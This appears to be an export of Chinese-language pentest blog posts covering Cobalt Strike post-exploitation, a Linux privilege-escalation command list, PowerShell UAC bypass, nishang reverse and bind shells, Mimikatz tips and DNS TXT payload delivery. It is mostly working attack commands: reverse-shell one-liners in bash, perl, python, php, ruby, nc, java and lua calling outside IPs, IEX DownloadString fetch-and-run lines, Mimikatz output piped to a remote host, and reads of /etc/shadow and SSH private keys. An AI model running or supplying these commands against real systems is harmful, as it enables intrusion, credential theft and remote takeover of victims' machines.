当受害者登录某网站账号以后，通过代理，本机浏览器同样登录该网站: 当然当被攻击者关闭浏览器的时候，代理也就失效了，关闭此代理可使用如下命令：1browserpivot stop 0x052 Socks可以直接开启socks4a代理，可以通过代理进行内网渗透测试。开启socks1beacon&gt;socks 9999 这里可以选择其中一台，右键Pivoting-&gt;SOCKS Server，则使用此台计算机开启socks代理。 配置proxychains.conf，添加1socks4 127.0.0.1 9999 然后就可以通过proxychains 使用各种工具做内网渗透了。 或者直接开启隧道使用msf，依次点击View-&gt;Proxy Pivots，选择Socks4a Proxy,点击Tunnel: 复制以后，在msf中执行，则可以开启代理： 关闭socks1beacon&gt;socks stop 0x053 Screenshot&amp;Keylogger这里的screenshot可以截取受害者一定时间的屏幕截图，操作命令为：1beacon&gt;screenshot [pid] &lt;x86|x64&gt; [run time in seconds] 或者1beacon&gt;screenshot 然后打开View-&gt;Screenshots，则可以看到屏幕截图： 键盘记录器的使用方式为：1Use: keylogger [pid] &lt;x86|x64&gt; 然后打开View-&gt;Keystrokes，则可以看到键盘记录结果： 如果不想使用命令行，可以直接选择受害者计算机（可多选），右键-&gt;Explore-&gt;Process List： 0x054 powershell-import这个功能在后渗透测试中很有用，可以导入各种powershell渗透框架，比如nishang的powerpreter，直接执行：1beacon&gt; powershell-import 然后在文件浏览器里面选择 Powerpreter.psm1： 或者直接执行：1powershell-import [/path/to/local/script.ps1] 进行导入，之后就可以使用powerpreter的各种模块了。 要执行某模块直接使用如下命令,比如：1beacon&gt; powershell Check-VM 关于powerpreter之前在zone有简单的介绍，powershell后渗透框架 powerpreter。 0x055 kerberos相关这里一共有三个模块，分别是： kerberos_ccache_use :从ccache文件中导入票据 kerberos_ticket_purge :清除当前会话的票据 kerberos_ticket_use：从ticket文件中导入票据 获取黄金票据的方式比如使用mimikatz:1kerberos::golden /admin:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FILE 乌云关于kerberos也有相关文章，有兴趣的可以看一下：内网渗透中的mimikatz域渗透的金之钥匙 据说这个在域渗透中很有用哟~ 0x056 BypassUAC什么，你不能读密码？试试bypassuac吧~直接执行1beacon&gt; bypassuac 下面你就可以执行那些需要最高权限的操作了。 这一块在测试Win10的时候并没有成功，关于Win10的bypassuac我在博客里面也有相关介绍，详情:戳我呀 在这里就演示使用bypassuac的powershell脚本来获取Win10最高权限，由于nishang的powershell脚本现在并不支持Win10,所以这里使用了一个我修改的powershell脚本 invoke-BypassUAC.ps1 生成一个beacon后门： 上传后门：12beacon&gt; cd E:beacon&gt; upload /Users/evi1cg/Desktop/test.exe 加载powershell执行后门：12beacon&gt; powershell-import /Users/evi1cg/Pentest/Powershell/MyShell/invoke-BypassUAC.ps1beacon&gt; powershell Invoke-BypassUAC -Command 'E:\test.exe' 然后他就破了： 使用那个破了的电脑的beacon读取密码：12beacon&gt; sleep 0beacon&gt; wdigest 1beacon&gt; hashdump 0x06 与msf联动cobalt strike3.0 不再使用Metasploit框架而作为一个独立的平台使用，那么怎么通过cobalt strike获取到meterpreter呢，别担心，可以做到的。首先我们使用msf的reverse_tcp开启监听模式：123456789msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpretermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.74.1 lhost =&gt; 192.168.74.1msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit -j 之后使用Cobalt Strike创建一个windows/foreign/reverse_tcp Listener： 其中ip为msf的ip地址，端口为msf所监听的端口。然后选中计算机，右键-&gt;Spawn: 选择刚刚创建的监听器： 可以看到成功获取了meterpreter回话： 0x07 小结此次测试使用windows/beacon_http/reverse_http来进行，具体DNS的监听器请参考luom所写Cobalt Strike 之团队服务器的搭建与DNS通讯演示，本篇文章只是介绍了Cobalt Strike的部分功能，如有错误，请各位大牛指正，关于Cobalt Strike其他的功能小伙伴们可以自己研究，如果可能的话，我也会对其进行补充。希望对各位小伙伴有用。]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>cobalt strike3.0</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 提权常用命令集]]></title>
    <url>%2Farchives%2FLinux_Command.html</url>
    <content type="text"><![CDATA[0x00 操作系统相关操作系统类型版本1234cat /etc/issuecat /etc/*-releasecat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat 内核版本，是否是64位123456cat /proc/versionuname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz- 环境变量1234567cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset 查看是否有打印机1lpstat -a 0x01 应用与服务相关查看正在运行的程序及对应的用户权限1234ps auxps -eftopcat /etc/services 以root权限运行的进程12ps aux | grep rootps -ef | grep root 查看安装了的应用123456ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesls -alh /var/cache/yum/ 一些服务的配置文件12345678910cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk '$1 ~ /^.*r.*/' 计划任务123456789101112crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root 找存储的明文用户名，密码1234grep -i user [filename]grep -i pass [filename]grep -C 5 "password" [filename]find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla 0x02 通信与网络相关查看当前网络地址123/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network 查看网络配置,DNS,DHCP,网关123456cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname 查看网络通信12345678910lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw 查看缓存123arp -eroute/sbin/route -nee tcpdump1tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21 tcpdump tcp dst [ip] [port] and tcp dst [ip] [port] 交互式shellbash版本：1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perl版本:1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' python版本:1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' php版本：1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' ruby版本：1ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' nc版本：1nc -e /bin/sh 223.8.200.234 1234 nc不使用-e：12mknod /tmp/backpipe p/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe mknod:1mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe java版本：123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() lua版本：1lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');" 端口转发 lcx12lcx -listen 4567 33891 #Attackerlcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]12ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Portssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe123mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) 隧道12ssh -D 127.0.0.1:9050 -N [username]@[ip]proxychains ifconfig 0x03 用户相关用户信息123456789101112idwhowlastcat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 &#123; print $1&#125;' # 列出超级用户awk -F: '($3 == "0") &#123;print&#125;' /etc/passwd #列出超级用户cat /etc/sudoerssudo -l 列家目录12ls -ahlR /root/ls -ahlR /home/ 从配置文件里面寻找密码123cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg 看其他用户的操作记录12345cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history ssh私钥123456789101112131415cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key 0x04 文件系统相关/etc/目录下面文件1234567ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2&gt;/dev/null # Anyonels -aRl /etc/ | awk '$1 ~ /^..w/' 2&gt;/dev/null # Ownerls -aRl /etc/ | awk '$1 ~ /^.....w/' 2&gt;/dev/null # Groupls -aRl /etc/ | awk '$1 ~ /w.$/' 2&gt;/dev/null # Otherfind /etc/ -readable -type f 2&gt;/dev/null # Anyonefind /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone 日志文件1234567ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases 查看网站文件12345ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/ 常见日志文件1234567891011121314151617181920212223242526272829303132333435363738cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/ 文件挂载123mountdf -hcat /etc/fstab Find命令12345678find / -perm -1000 -type d 2&gt;/dev/null # 只有目录所有者才可以更改删除find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUIDfor i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息 寻找可写目录12345678find / -writable -type d 2&gt;/dev/null # 可写目录find / -perm -222 -type d 2&gt;/dev/null # 可写目录 find / -perm -o w -type d 2&gt;/dev/null # 可写目录find / -perm -o x -type d 2&gt;/dev/null # 可执行目录find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # 可写可执行目录 查找文件12find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2&gt;/dev/null # 可写文件find / dir -xdev \( -nouser -o -nogroup \) -print 2&gt;/dev/null # 无所有者文件 0x05 准备及攻击查看语言支持1234find / -name perl*find / -name python*find / -name gcc*find / -name cc 查看上传方式12345find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp 寻找exphttp://www.exploit-db.comhttp://1337day.comhttp://www.securiteam.comhttp://www.securityfocus.comhttp://www.exploitsearch.nethttp://metasploit.com/modules/http://securityreason.comhttp://seclists.org/fulldisclosure/http://www.google.com 编译exp12which gccgcc exp.c -o exp 运行12chmod +x exp./exp 0x06 提权辅助脚本LinEnum linuxprivchecker.py 以上并不全，可能会有什么错误，请各位大大指正或补充。多多学习交流。]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Powershell Bypass UAC]]></title>
    <url>%2Farchives%2FPowershell_Bypass_UAC.html</url>
    <content type="text"><![CDATA[0x00 简介UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。许多情况下，我们获取了反弹的shell但是由于UAC这个烦人的东西并不能获取最高的权限，今天主要介绍使用powershell来bypass uac从而获取更高的权限。 0x01 Bypass UAC通常绕过UAC的方法如下： step1: 复制DLL文件到C:\Windows\System32\sysprep目录，DLL的名字取决于操作系统版本，比如Windows7为CRYPTBASE.dll，Windows8为shcore.dll。 step2：从上面的目录执行Sysprep.exe。他将加载上面的DLL，完成权限的提升。 具体dll名及利用exe如下表： 总结了一下突破Windows UAC的方式主要有以下几种： 1、使用IFileOperation COM接口； 2、使用Wusa.exe的extract选项； 3、远程注入SHELLCODE 到傀儡进程; 4、DLL劫持，劫持系统的DLL文件； 5、直接提权过UAC; 6、MS15-076(感觉上也可以用到) POC。 部分方式需要我们将DLL文件拷贝到相应的目录，这里拿Sysprep来做测试，要往这个目录拷贝文件需要管理员的权限，直接copy是不可以的,本文介绍的脚本使用了第二种方式，下面是一个测试。使用copy:1C:\UAC&gt;copy evil.dll C:\Windows\System32\sysprep\ 使用Wusa.exe：12C:\&gt; makecab C:\uac\evil.dll C:\uac\uac.cabC:\&gt; wusa C:\uac\uac.cab /extract:C:\Windows\System32\sysprep\ 可以看到使用wusa成功拷贝。 0x02 Invoke-PsUACmeInvoke-PsUACme 是nishang的一个脚本，该脚本使用了列表中的几个方式来进行bypass UAC，目前支持Win7 ，Win8,由于Win10的wusa extract选项不在受支持，所以此脚本并不适用于Win10。该脚本的所使用的DLL来自于开源项目UACME。nishang作者对代码进行了一下简单地修改，这里就不详细说了。这里介绍一下脚本的使用,加载脚本：1PS C:\UAC&gt; . .\Invoke-PsUACme.ps1 查看说明：1PS C:\UAC&gt; help Invoke-PsUACme 主要参数说明：Payload为自定义要执行的程序；method为bypass的方式，包括Sysprep，OOBE，ActionQueue等几种；Verbose显示程序运行过程；CustomDLL64,CustomDLL32可以指定自定义DLL。 执行：1PS C:\UAC&gt; Invoke-PsUACme -Verbose 使用Sysprep执行payload:1PS C:\UAC&gt; Invoke-PsUACme -method sysprep -Payload "cmd.exe" 执行某个自定义程序需要在payload出填写绝对路径。 自定义DLL：1PS C:\&gt; Invoke-PSUACMe -CustomDll64 C:\test\test64.dll -CustomDll32 C:\test\test32.dll -Verbose" 0x03 能做什么1）通过bypass UAC我们可以通过普通的cmd抓到管理员密码。普通cmd运行在线抓明文：1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz bypass UAC以后：12PS C:\UAC&gt; . .\Invoke-PsUACme.ps1PS C:\UAC&gt; Invoke-PsUACme -Payload "powershell -noexit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz" 2) 让meterpreter获得更高的权限。生成payload:1☁ ~ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=8889 -f psh-reflection 将输出文件保存为psh.ps1 msf开启监听：12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost x.x.x.xlhost =&gt; x.x.x.xmsf exploit(handler) &gt; set lport 8889lport =&gt; 8889msf exploit(handler) &gt; exploit 普通cmd执行: bypass UAC 以后执行： 0x04 Win10 Bypass UAC我修改了一个使用远程注入方式Bypass UAC的powersell脚本以支持Win10,脚本地址：戳我 使用方式与nishang不同，并没有回显，使用win10进行测试：12PS F:\drops\UAC&gt; . .\invoke-BypassUAC.ps1PS F:\drops\UAC&gt; invoke-BypassUAC -Command 'net user 1 "Password123!" /add' 除了上面的脚本，UACME也很好的支持win10,使用方式为：1234akagi32.exe 1akagi64.exe 3akagi32 1 c:\windows\system32\calc.exeakagi64 3 c:\windows\system32\cmd.exe 0x05 小结绕过UAC能获取更高的权限，你还发愁抓密码么？]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>uac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nishang之花样shell]]></title>
    <url>%2Farchives%2FNishang_shells.html</url>
    <content type="text"><![CDATA[nishang之花样shell 0x00 简介Nishang是基于PowerShell的渗透测试专用工具。集成了框架、脚本和各种payload。本篇主要介绍nishang中的各种shell。主要针对预装有powershell的系统。 0x01 TCP shell1.Reverse shellAttacker执行:12root@kali:~# nc -lvp 4444listening on [any] 4444 .. Victim执行:12PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1PS F:\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.52.129 -Port 4444 192.168.52.129 为Attacker IP地址。 效果如下： 数据报文如下： 从报文可以看出所有数据通过TCP传输，并且执行的命令以及返回的结果均在报文中可见。 2.Bind shellVictim 执行：12PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1PS F:\Shells&gt; Invoke-PowerShellTcp -Bind -Port 8888 Attacker 执行：12PS F:\Shells&gt; . .\powercat.ps1PS F:\Shells&gt; powercat -c 192.168.52.1 -v -p 8888 192.168.52.1 为Victim IP地址。 结果如下： 0x02 UDP Shell1.Reverse shellAttacker执行:12root@kali:~# nc -lvup 53listening on [any] 53 ... Victim执行:12PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1PS F:\Shells&gt; Invoke-PowerShellUdp -Reverse -IPAddress 192.168.52.129 -Port 53 192.168.52.129 为Attacker IP地址。 效果如下： 数据报文如下： 从报文可以看出所有数据通过UDP传输，并且执行的命令以及返回的结果均在报文中可见。 并且这种方式支持IPV6，如下图： 2.Bind shellVictim执行:12PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1PS F:\Shells&gt; Invoke-PowerShellUdp -Bind -Port 7777 Attacker执行:1root@kali:~# nc -vtu 192.168.52.1 7777 192.168.52.1 为Victim IP地址。 效果如下： 0x03 HTTP/HTTPS shell 这里要说明一下Invoke-PoshRatHttp/Invoke-PoshRatHttps 需要Attacker以管理员身份运行 1. HTTPAttacker执行: 123PS F:\Shells&gt; . .\Invoke-PoshRatHttp.ps1PS F:\Shells&gt; Invoke-PoshRatHttp -IPAddress 192.168.52.1 -Port 80Listening on 80 Victim执行:1PS C:\Users\evi1cg&gt; iex (New-Object Net.WebClient).DownloadString("http://192.168.52.1/connect") 192.168.52.1 为Attacker IP地址。 效果如下： 数据包如下： 从报文可以看出所有数据通过HTTP传输，并且执行的命令以及返回的结果均在报文中可见。 2. HTTPS笔者测试使用nishang作者最新的脚本出现错误如下：Attacker执行: 1234PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 8443Listening on 84436D559E5925FBCC8BE5FB3257F503CB8A6C5791A7 Victim执行:1PS C:\Users\evi1cg&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = &#123;$true&#125;;iex (New-Object Net.WebClient).DownloadString("https://192.168.52.1:8443/connect") 报错信息如下： 找到历史版本中的文件进行测试成功，Invoke-PoshRatHttps.ps1Attacker执行: 12PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 80 -SSLPort 443 这里如果出现“另一个程序正在使用此文件，进程无法访问的错误时，可以更换SSLPort端口 Victim执行(这里受害者请求的是HTTP): 1PS C:\Users\evi1cg&gt; iex (New-Object Net.WebClient).DownloadString("http://192.168.52.1/connect") 192.168.52.1 为Attacker IP地址。 效果如下： 数据报文如下： 通过报文可以看到，除了最初的连接请求是通过HTTP传输，其他的一切数据都是通过HTTPS连接进行通信，执行的命令及返回的结果在报文中不可见。 0x04 ICMP shell这里需要一个脚本icmpsh,Attacker执行:123☁ icmpsh [master] sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包或者pingnet.ipv4.icmp_echo_ignore_all = 1☁ icmpsh [master] python icmpsh_m.py 192.168.52.131 192.168.52.1 python icmpsh_m.py (Attacker’s IP) (Victims IP) Victim执行: 12PS F:\Shells&gt; . .\Invoke-PowerShellIcmp.ps1PS F:\Shells&gt; Invoke-PowerShellIcmp -IPAddress 192.168.52.131 执行结果： 数据报文如下： 从报文可以看出所有数据通过ICMP传输，并且执行的命令以及返回的结果均在报文中可见。 0x05 DNS shell此次示例需要dnscat2以及powercat 。安装完dnscat2后。Attacker执行:1☁ server [master] ⚡ ruby dnscat2.rb shellcome.com Victim执行: 12PS F:\Shells&gt; . .\powercat.ps1PS F:\Shells&gt; powercat -c 192.168.52.131 -v -dns shellcome.com -ep 192.168.52.131 为Attacker IP地址，即shellcome.com应该解析的IP地址。 执行效果: 数据报文如下： 通过报文可以看出所有数据通过DNS传输，并且执行的命令以及返回的结果均在报文中不可见。 0x06 小结 通过以上测试，可以看出HTTPS以及DNS方式的shell更为隐蔽。如果渗透测试过程个弹不出shell，那就换个姿势吧~]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>nishang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MAC tips]]></title>
    <url>%2Farchives%2FMAC.html</url>
    <content type="text"><![CDATA[1.更新loacte库1sudo /usr/libexec/locate.updatedb 2.macport跟homebrew不兼容。卸载macport：12345678910111213sudo port -f uninstall installedsudo port clean allsudo rm -rf \/opt/local \/Applications/DarwinPorts \/Applications/MacPorts \/Library/LaunchDaemons/org.macports.* \/Library/Receipts/DarwinPorts*.pkg \/Library/Receipts/MacPorts*.pkg \/Library/StartupItems/DarwinPortsStartup \/Library/Tcl/darwinports1.0 \/Library/Tcl/macports1.0 \~/.macports 3.开启转发：1sysctl -w net.inet.ip.forwarding=1]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mimikatz 使用Tips]]></title>
    <url>%2Farchives%2FTips_of_Mimikatz.html</url>
    <content type="text"><![CDATA[Mimikatz 使用Tips1.记录 Mimikatz输出：1C:\&gt;mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit &amp;&amp; dir 2.将输出导入到本地文件：1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit &gt;&gt; log.txt 3.将输出传输到远程机器：Attacker执行:1E:\&gt;nc -lvp 4444 Victim执行:1C:\&gt;mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.52.1 4444 192.168.52.1 为Attacker IP 4.通过nc远程执行Mimikatz：Victim执行:1C:\&gt;nc -lvp 443 Attacker执行:1E:\&gt;nc.exe -vv 192.168.52.128 443 -e mimikatz.exe 192.168.52.128 为Victim IP 5.hash传递12Privilege::debugsekurlsa::pth /domain:xxxx /user:xxxxx /ntlm:xxxxxx 之后会弹出cmd。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过DNS TXT记录执行powershell]]></title>
    <url>%2Farchives%2FExecPowershell_Use_DNSTXT.html</url>
    <content type="text"><![CDATA[通过DNS TXT记录执行powershell0x00简介 DNS TXT记录一般用来记录某个主机名或者域名设置的说明，在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。本篇文章主要介绍如何使用nishang通过创建TXT记录执行powershell脚本。当然，首先你要有一个域名。 0x01创建TXT记录 这里需要使用nishang中的一个脚本OUT-DnsTxt。 1.常见命令因为常见命令比较短，所以可以直接添加到TXT记录中，如下图： 现在查看一下TXT记录： 可以看到记录已经成功添加了。 2.脚本由于TXT记录长度限制为255,如果要添加一个脚本到记录里面，需要添加多个TXT记录。下面是一个例子,自己写了一个PSH脚本：123456789101112131415function Get-User&#123;&lt;#.SYNOPSISScript to generate DNS TXT for a test..DESCRIPTIONUse this script to get user information. to be more big.. more big... big..Do one thing at a time, and do well.Keep on going never give up..EXAMPLEPS &gt; Get-User#&gt;[CmdletBinding()]Param () net user&#125; 使用Out-Dnstxt进行转换：1234PS F:\DNS&gt; . .\Out-DnsTxt.ps1PS F:\DNS&gt; Out-DnsTxt -DataToEncode .\Get-User.ps1You need to create 2 TXT records.All TXT Records written to F:\DNS\encodedtxt.txt 由于这个脚本比较小，所以只生产两行： 可以分别将这两行内容按顺序添加到 1.ps.domain.com到2.ps.domian.com中如下图： 查看TXT，可以看到内容都已经添加好了： 0x02 执行Powershell 添加完了TXT记录以后，通过DNS_TXT_Pwnage.ps1来执行这些脚本。 DNS_TXT_Pwnage.ps1 是一个通过DNS TXT来接收命令或者脚本的一个后门脚本 这里还需要添加两条记录，strat与stop，具体如下图： 1.执行命令123PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring start -commanddomain command.evi1cg.me -psstring test -psdomain xxx.evi1cg.me -Subdomains 1 -StopString stop 解释一下参数： startdomain为创建的start.domain，返回一个字符串； cmdstring 为任意输入的字符串； commanddomain为创建的执行命令TXT记录的域名； psstring为任意输入的字符串； psdomain为创建的执行脚本TXT记录的域名或子域名 ； Subdomains为执行脚本创建TXT记录的个数（如1.2中创建的脚本，该值为2）； StopString为任意输入的字符串。 此处比较重要的参数为startdomain，他会与我们输入的cmdstring以及psstring进行比较，如果与cmdstring值相等，则执行commanddomain 即命令，与psstring相等则执行psdomain即脚本。 上面为执行命令，所以cmdstring值我们输入为start，与start.evi1cg.me的txt记录值相等，psstring随便输入，不留空就行。执行结果如下图： 我们可以通过修改command.domain的TXT值来执行不同的命令。比如Get-Host： 2.执行脚本123PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring bulabula -commanddomain command.evi1cg.me -psstring start -psdomain ps.evi1cg.me -Arguments Get-User -Subdomains 2 -StopString stop 这里要注意，psstring的值为start，与start.domain的TXT记录相同，cmdstring为任意字符串。效果如下图： 这里多一个参数Arguments，要写明要执行的函数名，测试发现，在脚本中含有中文时会失败。对于需要带参数的脚本可以修改脚本指定参数值。 0x03 执行Shellcode 可以通过TXT记录执行shellcode，首先，我们使用msf生成一个powershell的shellcode:1☁ ~ sudo msfvenom -p windows/meterpreter/reverse_tcp -f powershell LHOST=x.x.x.x LPORT=8887 &gt; pspayload.txt 使用Out-DnsTxt对生成的文件进行转换：123PS F:\DNS&gt; Out-DnsTxt -DataToEncode .\pspayload.txtYou need to create 3 TXT records.All TXT Records written to F:\DNS\encodedtxt.txt 然后将以上记录分别添加到TXT记录中，如下图： 测试使用的32位win7系统，使用msf开启监听：1234567891011msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; 